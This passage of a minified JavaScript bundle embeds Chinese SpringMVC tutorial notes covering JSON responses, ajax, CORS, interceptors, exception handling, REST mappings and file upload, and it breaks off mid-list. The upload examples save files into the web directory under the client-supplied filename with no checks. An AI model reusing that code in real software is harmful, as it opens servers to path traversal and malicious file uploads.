   //返回值设定成ModelAndView对象\r\n      return modelAndView;\r\n  }\r\n  ```\r\n\r\n## 5.4 返回json数据\r\n\r\n*   方式一：基于response返回数据的简化格式，返回JSON数据  \r\n\r\n  ```java\r\n  //使用jackson进行json数据格式转化\r\n  @RequestMapping("/showData3")\r\n  @ResponseBody\r\n  public String showData3() throws JsonProcessingException {\r\n      Book book  = new Book();\r\n      book.setName("SpringMVC入门案例");\r\n      book.setPrice(66.66d);\r\n  \r\n      ObjectMapper om = new ObjectMapper();\r\n      return om.writeValueAsString(book);\r\n  }\r\n  ```\r\n\r\n*    使用SpringMVC提供的消息类型转换器将对象与集合数据自动转换为JSON数据    \r\n\r\n  ```java\r\n  //使用SpringMVC注解驱动，对标注@ResponseBody注解的控制器方法进行结果转换，由于返回值为引用类型，自动调用jackson提供的类型转换器进行格式转换\r\n  @RequestMapping("/showData4")\r\n  @ResponseBody\r\n  public Book showData4() {\r\n      Book book  = new Book();\r\n      book.setName("SpringMVC入门案例");\r\n      book.setPrice(66.66d);\r\n      return book;\r\n  }\r\n  ```\r\n\r\n    需要手工添加信息类型转换器  \r\n\r\n  ```xml\r\n  <bean class="org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter">\r\n      <property name="messageConverters">\r\n          <list>\r\n              <bean class="org.springframework.http.converter.json.MappingJackson2HttpMessageConverter"/>\r\n          </list>\r\n      </property>\r\n  </bean\r\n  ```\r\n\r\n*   方式三：使用SpringMVC注解驱动简化配置  \r\n\r\n  ```xml\r\n  \x3c!--开启springmvc注解驱动，对@ResponseBody的注解进行格式增强，追加其类型转换的功能，具体实现由MappingJackson2HttpMessageConverter进行--\x3e\r\n  <mvc:annotation-driven/>\r\n  ```\r\n\r\n  \r\n\r\n# 6 Servlet相关接口-Servlet相关接口替换方案\r\n\r\n  **HttpServletRequest / HttpServletResponse / HttpSession**  \r\n\r\n*   **SpringMVC提供访问原始Servlet接口API的功能，通过形参声明即可**  \r\n\r\n  ```java\r\n  @RequestMapping("/servletApi")\r\n  public String servletApi(HttpServletRequest request,\r\n                           HttpServletResponse response, HttpSession session){\r\n      System.out.println(request);\r\n      System.out.println(response);\r\n      System.out.println(session);\r\n      request.setAttribute("name","itheima");\r\n      System.out.println(request.getAttribute("name"));\r\n      return "page.jsp";\r\n  }\r\n  ```\r\n\r\n*   **Head数据获取**  \r\n\r\n   名称： @RequestHeader\r\n   类型： 形参注解\r\n   位置：处理器类中的方法形参前方\r\n   作用：绑定请求头数据与对应处理方法形参间的关系\r\n   范例：\r\n\r\n  ```java\r\n  @RequestMapping("/headApi")\r\n  public String headApi(@RequestHeader("Accept-Language") String head){\r\n      System.out.println(head);\r\n      return "page.jsp";\r\n  }  \r\n  ```\r\n\r\n*   **Cookie数据获取**  \r\n\r\n   名称： @CookieValue\r\n   类型： 形参注解\r\n   位置：处理器类中的方法形参前方\r\n   作用：绑定请求Cookie数据与对应处理方法形参间的关系\r\n   范例：\r\n\r\n  ```java\r\n  @RequestMapping("/cookieApi")\r\n  public String cookieApi(@CookieValue("JSESSIONID") String jsessionid){\r\n      System.out.println(jsessionid);\r\n      return "page.jsp";\r\n  }  \r\n  ```\r\n\r\n*   **Session数据获取**  \r\n\r\n   名称： @SessionAttribute\r\n   类型： 形参注解\r\n   位置：处理器类中的方法形参前方\r\n   作用：绑定请求Session数据与对应处理方法形参间的关系\r\n   范例：\r\n\r\n  ```java\r\n  @RequestMapping("/sessionApi")\r\n  public String sessionApi(@SessionAttribute("name") String name){\r\n      System.out.println(name);\r\n      return "page.jsp";\r\n  }  \r\n  ```\r\n\r\n*   **Session数据设置（了解）**  \r\n\r\n   名称： @SessionAttributes\r\n   类型： 类注解\r\n   位置：处理器类上方\r\n   作用：声明放入session范围的变量名称，适用于Model类型数据传参\r\n   范例：\r\n\r\n  ```java\r\n  @Controller\r\n  @SessionAttributes(names={"name"})\r\n  public class ServletController {\r\n      @RequestMapping("/setSessionData2")\r\n      public String setSessionDate2(Model model) {\r\n          model.addAttribute("name", "Jock2");\r\n          return "page.jsp";\r\n      }\r\n  }  \r\n  ```\r\n\r\n*   **注解式参数数据封装底层原理**  \r\n\r\n   数据的来源不同，对应的处理策略要进行区分\r\n   Head\r\n   Cookie\r\n   Session\r\n   SpringMVC使用策略模式进行处理分发\r\n   顶层接口： HandlerMethodArgumentResolver\r\n   实现类： ……  ',Ke={data:function(){return{MainComponent:Qe}}},Xe=Ke,Ye=Object(u["a"])(Xe,Ge,Ve,!1,null,"24f050c3",null),Ze=Ye.exports,na=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},ra=[],ta='# 1 异步调用\r\n\r\n## 1.1 发送异步请求（回顾）  \r\n\r\n```js\r\n<a href="javascript:void(0);" id="testAjax">访问controller</a>\r\n<script type="text/javascript" src="/js/jquery-3.3.1.min.js"><\/script>\r\n<script type="text/javascript">\r\n    $(function(){\r\n    $("#testAjax").click(function(){ //为id="testAjax"的组件绑定点击事件\r\n        $.ajax({ //发送异步调用\r\n            type:"POST", //请求方式： POST请求\r\n            url:"ajaxController", //请求参数（也就是请求内容）\r\n            data:\'ajax message\', //请求参数（也就是请求内容）\r\n            dataType:"text", //响应正文类型\r\n            contentType:"application/text", //请求正文的MIME类型\r\n        });\r\n    });\r\n});\r\n<\/script>\r\n```\r\n\r\n## 1.2 接受异步请求参数\r\n\r\n 名称： @RequestBody\r\n 类型： 形参注解\r\n 位置：处理器类中的方法形参前方\r\n 作用：将异步提交数据组织成标准请求参数格式，并赋值给形参\r\n 范例：\r\n\r\n```java\r\n@RequestMapping("/ajaxController")\r\npublic String ajaxController(@RequestBody String message){\r\n    System.out.println(message);\r\n    return "page.jsp";\r\n}  \r\n```\r\n\r\n* 注解添加到Pojo参数前方时，封装的异步提交数据按照Pojo的属性格式进行关系映射\r\n* 注解添加到集合参数前方时，封装的异步提交数据按照集合的存储结构进行关系映射 \r\n\r\n```java\r\n@RequestMapping("/ajaxPojoToController")\r\n//如果处理参数是POJO，且页面发送的请求数据格式与POJO中的属性对应，@RequestBody注解可以自动映射对应请求数据到POJO中\r\n//注意：POJO中的属性如果请求数据中没有，属性值为null，POJO中没有的属性如果请求数据中有，不进行映射\r\npublic String  ajaxPojoToController(@RequestBody User user){\r\n    System.out.println("controller pojo :"+user);\r\n    return "page.jsp";\r\n}\r\n\r\n@RequestMapping("/ajaxListToController")\r\n//如果处理参数是List集合且封装了POJO，且页面发送的数据是JSON格式的对象数组，数据将自动映射到集合参数中\r\npublic String  ajaxListToController(@RequestBody List<User> userList){\r\n    System.out.println("controller list :"+userList);\r\n    return "page.jsp";\r\n}\r\n```\r\n\r\n## 1.3 异步请求接受响应数据\r\n\r\n* 方法返回值为Pojo时，自动封装数据成json对象数据\r\n\r\n```java\r\n@RequestMapping("/ajaxReturnJson")\r\n@ResponseBody\r\npublic User ajaxReturnJson(){\r\n    System.out.println("controller return json pojo...");\r\n    User user = new User();\r\n    user.setName("Jockme");\r\n    user.setAge(40);\r\n    return user;\r\n}  \r\n```\r\n\r\n* 方法返回值为List时，自动封装数据成json对象数组数据  \r\n\r\n```java\r\n@RequestMapping("/ajaxReturnJsonList")\r\n@ResponseBody\r\n//基于jackon技术，使用@ResponseBody注解可以将返回的保存POJO对象的集合转成json数组格式数据\r\npublic List ajaxReturnJsonList(){\r\n    System.out.println("controller return json list...");\r\n    User user1 = new User();\r\n    user1.setName("Tom");\r\n    user1.setAge(3);\r\n\r\n    User user2 = new User();\r\n    user2.setName("Jerry");\r\n    user2.setAge(5);\r\n\r\n    ArrayList al = new ArrayList();\r\n    al.add(user1);\r\n    al.add(user2);\r\n\r\n    return al;\r\n}\r\n```\r\n\r\n# 2 异步请求-跨域访问\r\n\r\n## 2.1 跨域访问介绍\r\n\r\n* 当通过域名A下的操作访问域名B下的资源时，称为跨域访问\r\n* 跨域访问时，会出现无法访问的现象   \r\n\r\n![image-20200427162623591](./img/java/springmvc/SpringMVC-day02/image-20200427162623591.png)\r\n\r\n## 2.2 跨域环境搭建\r\n\r\n* 为当前主机添加备用域名\r\n  * 修改windows安装目录中的host文件\r\n  *  格式： ip 域名\r\n* 动态刷新DNS\r\n  *  命令： ipconfig /displaydns\r\n  *  命令： ipconfig /flushdns   \r\n\r\n## 2.3 跨域访问支持  \r\n\r\n 名称： @CrossOrigin\r\n 类型： 方法注解 、 类注解\r\n 位置：处理器类中的方法上方 或 类上方\r\n 作用：设置当前处理器方法/处理器类中所有方法支持跨域访问\r\n 范例：  \r\n\r\n```java\r\n@RequestMapping("/cross")\r\n@ResponseBody\r\n//使用@CrossOrigin开启跨域访问\r\n//标注在处理器方法上方表示该方法支持跨域访问\r\n//标注在处理器类上方表示该处理器类中的所有处理器方法均支持跨域访问\r\n@CrossOrigin\r\npublic User cross(HttpServletRequest request){\r\n    System.out.println("controller cross..."+request.getRequestURL());\r\n    User user = new User();\r\n    user.setName("Jockme");\r\n    user.setAge(39);\r\n    return user;\r\n}\r\n```\r\n\r\n# 3 拦截器\r\n\r\n## 3.1 拦截器概念\r\n\r\n* 请求处理过程解析  \r\n\r\n![image-20200427164038103](./img/java/springmvc/SpringMVC-day02/image-20200427164038103.png)\r\n\r\n 拦截器（ Interceptor）是一种动态拦截方法调用的机制\r\n 作用：\r\n   \t1. 在指定的方法调用前后执行预先设定后的的代码\r\n \t2. 阻止原始方法的执行\r\n\r\n 核心原理： AOP思想\r\n 拦截器链：多个拦截器按照一定的顺序，对原始被调用功能进行增强  \r\n\r\n\r\n\r\n* **拦截器VS过滤器**\r\n   归属不同： Filter属于Servlet技术， Interceptor属于SpringMVC技术\r\n   拦截内容不同： Filter对所有访问进行增强， Interceptor仅针对SpringMVC的访问进行增强  \r\n  \r\n  ![image-20200427164512745](./img/java/springmvc/SpringMVC-day02/image-20200427164512745.png)\r\n\r\n## 3.2 自定义拦截器开发过程\r\n\r\n* 实现HandlerInterceptor接口  \r\n\r\n  ```java\r\n  //自定义拦截器需要实现HandleInterceptor接口\r\n  public class MyInterceptor implements HandlerInterceptor {\r\n      //处理器运行之前执行\r\n      @Override\r\n      public boolean preHandle(HttpServletRequest request,\r\n                               HttpServletResponse response,\r\n                               Object handler) throws Exception {\r\n          System.out.println("前置运行----a1");\r\n          //返回值为false将拦截原始处理器的运行\r\n          //如果配置多拦截器，返回值为false将终止当前拦截器后面配置的拦截器的运行\r\n          return true;\r\n      }\r\n  \r\n      //处理器运行之后执行\r\n      @Override\r\n      public void postHandle(HttpServletRequest request,\r\n                             HttpServletResponse response,\r\n                             Object handler,\r\n                             ModelAndView modelAndView) throws Exception {\r\n          System.out.println("后置运行----b1");\r\n      }\r\n  \r\n      //所有拦截器的后置执行全部结束后，执行该操作\r\n      @Override\r\n      public void afterCompletion(HttpServletRequest request,\r\n                                  HttpServletResponse response,\r\n                                  Object handler,\r\n                                  Exception ex) throws Exception {\r\n          System.out.println("完成运行----c1");\r\n      }\r\n  \r\n      //三个方法的运行顺序为    preHandle -> postHandle -> afterCompletion\r\n      //如果preHandle返回值为false，三个方法仅运行preHandle\r\n  }\r\n  ```\r\n\r\n  \r\n\r\n*   配置拦截器  \r\n\r\n  配置拦截器  \r\n\r\n```xml\r\n<mvc:interceptors>\r\n    <mvc:interceptor>\r\n        <mvc:mapping path="/showPage"/>\r\n        <bean class="com.itheima.interceptor.MyInterceptor"/>\r\n    </mvc:interceptor>\r\n</mvc:interceptors>\r\n```\r\n\r\n  <u>注意：配置顺序为先配置执行位置，后配置执行类</u>  \r\n\r\n## 3.3 拦截器执行流程\r\n\r\n![image-20200427164840131](./img/java/springmvc/SpringMVC-day02/image-20200427164840131.png)\r\n\r\n\r\n\r\n## 3.4 拦截器配置与方法参数\r\n\r\n### 3.4.1 前置处理方法\r\n\r\n原始方法之前运行\r\n\r\n```java\r\npublic boolean preHandle(HttpServletRequest request,\r\n                         HttpServletResponse response,\r\n                         Object handler) throws Exception {\r\n    System.out.println("preHandle");\r\n    return true;\r\n}\r\n```\r\n\r\n* 参数\r\n   request:请求对象\r\n   response:响应对象\r\n   handler:被调用的处理器对象，本质上是一个方法对象，对反射中的Method对象进行了再包装\r\n* 返回值\r\n   返回值为false，被拦截的处理器将不执行  \r\n\r\n### 3.4.2   后置处理方法\r\n\r\n原始方法运行后运行，如果原始方法被拦截，则不执行  \r\n\r\n```java\r\npublic void postHandle(HttpServletRequest request,\r\n                       HttpServletResponse response,\r\n                       Object handler,\r\n                       ModelAndView modelAndView) throws Exception {\r\n    System.out.println("postHandle");\r\n}\r\n```\r\n\r\n 参数\r\n modelAndView:如果处理器执行完成具有返回结果，可以读取到对应数据与页面信息，并进行调整  \r\n\r\n### 3.4.3 完成处理方法\r\n\r\n  拦截器最后执行的方法，无论原始方法是否执行  \r\n\r\n```java\r\npublic void afterCompletion(HttpServletRequest request,\r\n                            HttpServletResponse response,\r\n                            Object handler,\r\n                            Exception ex) throws Exception {\r\n    System.out.println("afterCompletion");\r\n}\r\n```\r\n\r\n 参数\r\n ex:如果处理器执行过程中出现异常对象，可以针对异常情况进行单独处理  \r\n\r\n## 3.5 拦截器配置项  \r\n\r\n```xml\r\n<mvc:interceptors>\r\n    \x3c!--开启具体的拦截器的使用，可以配置多个--\x3e\r\n    <mvc:interceptor>\r\n        \x3c!--设置拦截器的拦截路径，支持*通配--\x3e\r\n        \x3c!--/**         表示拦截所有映射--\x3e\r\n        \x3c!--/*          表示拦截所有/开头的映射--\x3e\r\n        \x3c!--/user/*     表示拦截所有/user/开头的映射--\x3e\r\n        \x3c!--/user/add*  表示拦截所有/user/开头，且具体映射名称以add开头的映射--\x3e\r\n        \x3c!--/user/*All  表示拦截所有/user/开头，且具体映射名称以All结尾的映射--\x3e\r\n        <mvc:mapping path="/*"/>\r\n        <mvc:mapping path="/**"/>\r\n        <mvc:mapping path="/handleRun*"/>\r\n        \x3c!--设置拦截排除的路径，配置/**或/*，达到快速配置的目的--\x3e\r\n        <mvc:exclude-mapping path="/b*"/>\r\n        \x3c!--指定具体的拦截器类--\x3e\r\n        <bean class="MyInterceptor"/>\r\n    </mvc:interceptor>\r\n</mvc:interceptors>\r\n```\r\n\r\n\r\n\r\n## 3.6 多拦截器配置\r\n\r\n![image-20200427171422781](./img/java/springmvc/SpringMVC-day02/image-20200427171422781.png)\r\n\r\n**责任链模式**\r\n 责任链模式是一种行为模式\r\n 特征：\r\n沿着一条预先设定的任务链顺序执行，每个节点具有独立的工作任务\r\n 优势：\r\n独立性：只关注当前节点的任务，对其他任务直接放行到下一节点\r\n隔离性：具备链式传递特征，无需知晓整体链路结构，只需等待请求到达后进行处理即可\r\n灵活性：可以任意修改链路结构动态新增或删减整体链路责任\r\n解耦：将动态任务与原始任务解耦\r\n 弊端：\r\n链路过长时，处理效率低下\r\n可能存在节点上的循环引用现象，造成死循环，导致系统崩溃  \r\n\r\n# 4 异常处理\r\n\r\n## 4.1 异常处理器\r\n\r\n  **HandlerExceptionResolver**接口（异常处理器）  \r\n\r\n```java\r\n@Component\r\npublic class ExceptionResolver implements HandlerExceptionResolver {\r\n    public ModelAndView resolveException(HttpServletRequest request,\r\n                                         HttpServletResponse response,\r\n                                         Object handler,\r\n                                         Exception ex) {\r\n        System.out.println("异常处理器正在执行中");\r\n        ModelAndView modelAndView = new ModelAndView();\r\n        //定义异常现象出现后，反馈给用户查看的信息\r\n        modelAndView.addObject("msg","出错啦！ ");\r\n        //定义异常现象出现后，反馈给用户查看的页面\r\n        modelAndView.setViewName("error.jsp");\r\n        return modelAndView;\r\n    }\r\n}\r\n```\r\n\r\n  根据异常的种类不同，进行分门别类的管理，返回不同的信息  \r\n\r\n```java\r\npublic class ExceptionResolver implements HandlerExceptionResolver {\r\n    @Override\r\n    public ModelAndView resolveException(HttpServletRequest request,\r\n                                         HttpServletResponse response,\r\n                                         Object handler,\r\n                                         Exception ex) {\r\n        System.out.println("my exception is running ...."+ex);\r\n        ModelAndView modelAndView = new ModelAndView();\r\n        if( ex instanceof NullPointerException){\r\n            modelAndView.addObject("msg","空指针异常");\r\n        }else if ( ex instanceof  ArithmeticException){\r\n            modelAndView.addObject("msg","算数运算异常");\r\n        }else{\r\n            modelAndView.addObject("msg","未知的异常");\r\n        }\r\n        modelAndView.setViewName("error.jsp");\r\n        return modelAndView;\r\n    }\r\n}\r\n```\r\n\r\n## 4.2 注解开发异常处理器\r\n\r\n* 使用注解实现异常分类管理\r\n   名称： @ControllerAdvice\r\n   类型： 类注解\r\n   位置：异常处理器类上方\r\n   作用：设置当前类为异常处理器类\r\n   范例：\r\n\r\n```java\r\n@Component\r\n@ControllerAdvice\r\npublic class ExceptionAdvice {\r\n}  \r\n```\r\n\r\n* 使用注解实现异常分类管理\r\n   名称： @ExceptionHandler\r\n   类型： 方法注解\r\n   位置：异常处理器类中针对指定异常进行处理的方法上方\r\n   作用：设置指定异常的处理方式\r\n   范例：\r\n   说明：处理器方法可以设定多个\r\n ```java\r\n@ExceptionHandler(Exception.class)\r\n@ResponseBody\r\npublic String doOtherException(Exception ex){\r\n    return "出错啦，请联系管理员！ ";\r\n}  \r\n ```\r\n\r\n## 4.3 异常处理解决方案\r\n\r\n* 异常处理方案\r\n  * 业务异常：\r\n     发送对应消息传递给用户，提醒规范操作\r\n  * 系统异常：\r\n     发送固定消息传递给用户，安抚用户\r\n     发送特定消息给运维人员，提醒维护\r\n     记录日志\r\n  * 其他异常：\r\n     发送固定消息传递给用户，安抚用户\r\n     发送特定消息给编程人员，提醒维护\r\n     纳入预期范围内\r\n     记录日志  \r\n\r\n## 4.4 自定义异常\r\n\r\n* 异常定义格式\r\n\r\n  ```java\r\n  //自定义异常继承RuntimeException，覆盖父类所有的构造方法\r\n  public class BusinessException extends RuntimeException {\r\n      public BusinessException() {\r\n      }\r\n  \r\n      public BusinessException(String message) {\r\n          super(message);\r\n      }\r\n  \r\n      public BusinessException(String message, Throwable cause) {\r\n          super(message, cause);\r\n      }\r\n  \r\n      public BusinessException(Throwable cause) {\r\n          super(cause);\r\n      }\r\n  \r\n      public BusinessException(String message, Throwable cause, boolean enableSuppression, boolean writableStackTrace) {\r\n          super(message, cause, enableSuppression, writableStackTrace);\r\n      }\r\n  }\r\n  ```\r\n\r\n* 异常触发方式\r\n\r\n  ```java\r\n  if(user.getName().trim().length()<4) {\r\n      throw new BusinessException("用户名长度必须在2-4位之间，请重新输入！ ");\r\n  }\r\n  ```\r\n\r\n* 通过自定义异常将所有的异常现象进行分类管理，以统一的格式对外呈现异常消息  \r\n\r\n# 5 实用技术\r\n\r\n## 5.1 文件上传下载\r\n\r\n* 上传文件过程分析  \r\n\r\n  ![image-20200427174442939](./img/java/springmvc/SpringMVC-day02/image-20200427174442939.png)\r\n\r\n*   MultipartResolver接口  \r\n\r\n  *  MultipartResolver接口定义了文件上传过程中的相关操作，并对通用性操作进行了封装\r\n  * MultipartResolver接口底层实现类CommonsMultipartResovler\r\n  * CommonsMultipartResovler并未自主实现文件上传下载对应的功能，而是调用了apache的文件上传下载组件  \r\n\r\n  ```xml\r\n  <dependency>\r\n      <groupId>commons-fileupload</groupId>\r\n      <artifactId>commons-fileupload</artifactId>\r\n      <version>1.4</version>\r\n  </dependency>\r\n  ```\r\n\r\n* 文件上传下载实现\r\n\r\n  *   页面表单  \r\n\r\n    ```html\r\n    <form action="/fileupload" method="post" enctype="multipart/form-data">\r\n        上传LOGO： <input type="file" name="file"/><br/>\r\n        <input type="submit" value="上传"/>\r\n    </form>\r\n    ```\r\n\r\n  *   SpringMVC配置  \r\n\r\n    ```xml\r\n    <bean id="multipartResolver"\r\n          class="org.springframework.web.multipart.commons.CommonsMultipartResolver">\r\n    </bean>\r\n    ```\r\n\r\n  *   控制器  \r\n\r\n    ```java\r\n    @RequestMapping(value = "/fileupload")\r\n    public void fileupload(MultipartFile file){\r\n        file.transferTo(new File("file.png"));\r\n    }\r\n    ```\r\n\r\n## 5.2 文件上传注意事项\r\n\r\n1. 文件命名问题， 获取上传文件名，并解析文件名与扩展名\r\n2. 文件名过长问题\r\n3. 文件保存路径\r\n4. 重名问题\r\n\r\n```java\r\n@RequestMapping(value = "/fileupload")\r\n//参数中定义MultipartFile参数，用于接收页面提交的type=file类型的表单，要求表单名称与参数名相同\r\npublic String fileupload(MultipartFile file,MultipartFile file1,MultipartFile file2, HttpServletRequest request) throws IOException {\r\n    System.out.println("file upload is running ..."+file);\r\n    //        MultipartFile参数中封装了上传的文件的相关信息\r\n    //        System.out.println(file.getSize());\r\n    //        System.out.println(file.getBytes().length);\r\n    //        System.out.println(file.getContentType());\r\n    //        System.out.println(file.getName());\r\n    //        System.out.println(file.getOriginalFilename());\r\n    //        System.out.println(file.isEmpty());\r\n    //首先判断是否是空文件，也就是存储空间占用为0的文件\r\n    if(!file.isEmpty()){\r\n        //如果大小在范围要求内正常处理，否则抛出自定义异常告知用户（未实现）\r\n        //获取原始上传的文件名，可以作为当前文件的真实名称保存到数据库中备用\r\n        String fileName = file.getOriginalFilename();\r\n        //设置保存的路径\r\n        String realPath = request.getServletContext().getRealPath("/images");\r\n        //保存文件的方法，指定保存的位置和文件名即可，通常文件名使用随机生成策略产生，避免文件名冲突问题\r\n        file.transferTo(new File(realPath,file.getOriginalFilename()));\r\n    }\r\n    //测试一次性上传多个文件\r\n    if(!file1.isEmpty()){\r\n        String fileName = file1.getOriginalFilename();\r\n        //可以根据需要，对不同种类的文件做不同的存储路径的区分，修改对应的保存位置即可\r\n        String realPath = request.getServletContext().getRealPath("/images");\r\n        file1.transferTo(new File(realPath,file1.getOriginalFilename()));\r\n    }\r\n    if(!file2.isEmpty()){\r\n        String fileName = file2.getOriginalFilename();\r\n        String realPath = request.getServletContext().getRealPath("/images");\r\n        file2.transferTo(new File(realPath,file2.getOriginalFilename()));\r\n    }\r\n    return "page.jsp";\r\n}\r\n```\r\n\r\n## 5.4 Restful风格配置\r\n\r\n### 5.4.1 Rest\r\n\r\n* Rest（ REpresentational State Transfer） 一种网络资源的访问风格，定义了网络资源的访问方式\r\n  * 传统风格访问路径\r\n     http://localhost/user/get?id=1\r\n     http://localhost/deleteUser?id=1\r\n  * Rest风格访问路径\r\n     http://localhost/user/1\r\n* Restful是按照Rest风格访问网络资源\r\n* 优点\r\n   隐藏资源的访问行为，通过地址无法得知做的是何种操作\r\n   书写简化\r\n\r\n### 5.4.2 Rest行为约定方式  \r\n\r\n GET（查询） http://localhost/user/1 GET\r\n POST（保存） http://localhost/user POST\r\n PUT（更新） http://localhost/user PUT\r\n DELETE（删除） http://localhost/user DELETE\r\n**注意：**上述行为是约定方式，约定不是规范，可以打破，所以称Rest风格，而不是Rest规范  \r\n\r\n### 5.4.3 Restful开发入门  \r\n\r\n```java\r\n//设置rest风格的控制器\r\n@RestController\r\n//设置公共访问路径，配合下方访问路径使用\r\n@RequestMapping("/user/")\r\npublic class UserController {\r\n\r\n    //rest风格访问路径完整书写方式\r\n    @RequestMapping("/user/{id}")\r\n    //使用@PathVariable注解获取路径上配置的具名变量，该配置可以使用多次\r\n    public String restLocation(@PathVariable Integer id){\r\n        System.out.println("restful is running ....");\r\n        return "success.jsp";\r\n    }\r\n\r\n    //rest风格访问路径简化书写方式，配合类注解@RequestMapping使用\r\n    @RequestMapping("{id}")\r\n    public String restLocation2(@PathVariable Integer id){\r\n        System.out.println("restful is running ....get:"+id);\r\n        return "success.jsp";\r\n    }\r\n\r\n    //接收GET请求配置方式\r\n    @RequestMapping(value = "{id}",method = RequestMethod.GET)\r\n    //接收GET请求简化配置方式\r\n    @GetMapping("{id}")\r\n    public String get(@PathVariable Integer id){\r\n        System.out.println("restful is running ....get:"+id);\r\n        return "success.jsp";\r\n    }\r\n\r\n    //接收POST请求配置方式\r\n    @RequestMapping(value = "{id}",method = RequestMethod.POST)\r\n    //接收POST请求简化配置方式\r\n    @PostMapping("{id}")\r\n    public String post(@PathVariable Integer id){\r\n        System.out.println("restful is running ....post:"+id);\r\n        return "success.jsp";\r\n    }\r\n\r\n    //接收PUT请求简化配置方式\r\n    @RequestMapping(value = "{id}",method = RequestMethod.PUT)\r\n    //接收PUT请求简化配置方式\r\n    @PutMapping("{id}")\r\n    public String put(@PathVariable Integer id){\r\n        System.out.println("restful is running ....put:"+id);\r\n        return "success.jsp";\r\n    }\r\n\r\n    //接收DELETE请求简化配置方式\r\n    @RequestMapping(value = "{id}",method = RequestMethod.DELETE)\r\n    //接收DELETE请求简化配置方式\r\n    @DeleteMapping("{id}")\r\n    public String delete(@PathVariable Integer id){\r\n        System.out.println("restful is running ....delete:"+id);\r\n        return "success.jsp";\r\n    }\r\n}\r\n```\r\n\r\n```xml\r\n\x3c!--配置拦截器，解析请求中的参数_method，否则无法发起PUT请求与DELETE请求，配合页面表单使用--\x3e\r\n<filter>\r\n    <filter-name>HiddenHttpMethodFilter</filter-name>\r\n    <filter-class>org.springframework.web.filter.HiddenHttpMethodFilter</filter-class>\r\n</filter>\r\n<filter-mapping>\r\n    <filter-name>HiddenHttpMethodFilter</filter-name>\r\n    <servlet-name>DispatcherServlet</servlet-name>\r\n</filter-mapping>\r\n```\r\n\r\n 开启SpringMVC对Restful风格的访问支持过滤器，即可通过页面表单提交PUT与DELETE请求\r\n 页面表单使用隐藏域提交请求类型，参数名称固定为_method，必须配合提交类型method=post使用\r\n\r\n```xml\r\n<form action="/user/1" method="post">\r\n    <input type="hidden" name="_method" value="PUT"/>\r\n    <input type="submit"/>\r\n</form>  \r\n```\r\n\r\n*   Restful请求路径简化配置方式  \r\n\r\n  ```java\r\n  @RestController\r\n  public class UserController {\r\n      @RequestMapping(value = "/user/{id}",method = RequestMethod.DELETE)\r\n      public String restDelete(@PathVariable String id){\r\n          System.out.println("restful is running ....delete:"+id);\r\n          return "success.jsp";\r\n      }\r\n  }  \r\n  ```\r\n\r\n## 5.5 postman工具安装与使用\r\n\r\n**postman** 是  一款可以发送Restful风格请求的工具，方便开发调试。首次运行需要联网注册  \r\n\r\n![image-20200427180851880](./img/java/springmvc/SpringMVC-day02/image-20200427180851880.png)\r\n\r\n',ea={data:function(){return{MainComponent:ta}}},aa=ea,ia=Object(u["a"])(aa,na,ra,!1,null,"f43f4576",null),sa=ia.exports,oa=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},la=[],ca='\x3c!--\r\n * @Date           : 2021-04-28 01:12:51\r\n * @FilePath       : /jinnian-space/src/pages/java/module/springmvc/md/SpringMVC-day03.md\r\n * @Description    : \r\n--\x3e\r\n# 1 校验框架\r\n\r\n## 1.1 校验框架入门\r\n\r\n### 1.1.1 表单校验的重要性\r\n\r\n* 表单校验保障了数据有效性、安全性  \r\n\r\n![image-20200505144306747](./img/java/springmvc/SpringMVC-day03/image-20200505144306747.png)\r\n\r\n数据可以随意输入，导致错误的结果。后端表单校验的重要性。\r\n\r\n### 1.1.2 表单校验分类  \r\n\r\n* 校验位置：\r\n  * 客户端校验\r\n  * 服务端校验\r\n* 校验内容与对应方式：\r\n  * 格式校验\r\n    * 客户端：使用Js技术，利用正则表达式校验\r\n    * 服务端：使用校验框架 \r\n  * 逻辑校验\r\n    * 客户端：使用ajax发送要校验的数据，在服务端完成逻辑校验，返回校验结果\r\n    * 服务端：接收到完整的请求后，在执行业务操作前，完成逻辑校验\r\n\r\n###  1.1.3 表单校验规则\r\n\r\n* 长度：例如用户名长度，评论字符数量\r\n* 非法字符：例如用户名组成\r\n* 数据格式：例如Email格式、 IP地址格式\r\n* 边界值：例如转账金额上限，年龄上下限\r\n* 重复性：例如用户名是否重复\r\n\r\n### 1.1.4 表单校验框架\r\n\r\n* JSR（Java Specification Requests）：Java 规范提案  \r\n\r\n    303：提供bean属性相关校验规则  \r\n\r\n* JSR规范列表\r\n  * 企业应用技术\r\n     Contexts and Dependency Injection for Java (Web Beans 1.0) (JSR 299)\r\n     Dependency Injection for Java 1.0 (JSR 330)@postConstruct, @PreDestroy\r\n     Bean Validation 1.0 (JSR 303)\r\n     Enterprise JavaBeans 3.1 (includes Interceptors 1.1) (JSR 318)\r\n     Java EE Connector Architecture 1.6 (JSR 322)\r\n     Java Persistence 2.0 (JSR 317)\r\n     Common Annotations for the Java Platform 1.1 (JSR 250)\r\n     Java Message Service API 1.1 (JSR 914)\r\n     Java Transaction API (JTA) 1.1 (JSR 907)\r\n     JavaMail 1.4 (JSR 919)\r\n  * Web应用技术\r\n     Java Servlet 3.0 (JSR 315)\r\n     JavaServer Faces 2.0 (JSR 314)\r\n     JavaServer Pages 2.2/Expression Language 2.2 (JSR 245)\r\n     Standard Tag Library for JavaServer Pages (JSTL) 1.2 (JSR 52)\r\n     Debugging Support for Other Languages 1.0 (JSR 45)\r\n     模块化 (JSR 294)\r\n     Swing应用框架 (JSR 296)\r\n     JavaBeans Activation Framework (JAF) 1.1 (JSR 925)\r\n     Streaming API for XML (StAX) 1.0 (JSR 173)\r\n  * 管理与安全技术\r\n     Java Authentication Service Provider Interface for Containers (JSR 196)\r\n     Java Authorization Contract for Containers 1.3 (JSR 115)\r\n     Java EE Application Deployment 1.2 (JSR 88)\r\n     J2EE Management 1.1 (JSR 77)\r\n     Java SE中与Java EE有关的规范\r\n     JCache API (JSR 107)\r\n     Java Memory Model (JSR 133)\r\n     Concurrency Utilitie (JSR 166)\r\n     Java API for XML Processing (JAXP) 1.3 (JSR 206)\r\n     Java Database Connectivity 4.0 (JSR 221)\r\n     Java Management Extensions (JMX) 2.0 (JSR 255)\r\n     Java Portlet API (JSR 286)\r\n\r\n* Web Service技术\r\n   Java Date与Time API (JSR 310)\r\n   Java API for RESTful Web Services (JAX-RS) 1.1 (JSR 311)\r\n   Implementing Enterprise Web Services 1.3 